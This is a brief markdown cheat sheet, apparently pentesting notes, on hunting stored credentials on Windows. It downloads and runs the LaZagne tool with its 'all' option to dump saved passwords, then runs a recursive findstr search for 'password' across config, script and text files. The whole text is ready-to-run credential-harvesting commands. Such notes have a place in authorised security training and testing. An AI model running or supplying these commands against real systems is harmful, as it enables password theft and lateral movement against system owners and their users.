
## Hunt Credentials

### using `LaZagne`

- **SETUP**
	- Download the standalone `.exe` binary

```bash
wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe
```

- Using `LaZagne` we can hunt credentials insecurely stored inside Windows.

```cmd
start LaZagne.exe all
```

### using `findstr`

- you can specify your own **wildcards** using the `*` symbol if you are looking for a specific file type.
- The `"password"` will change then and might get replaced by another keyword.

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```




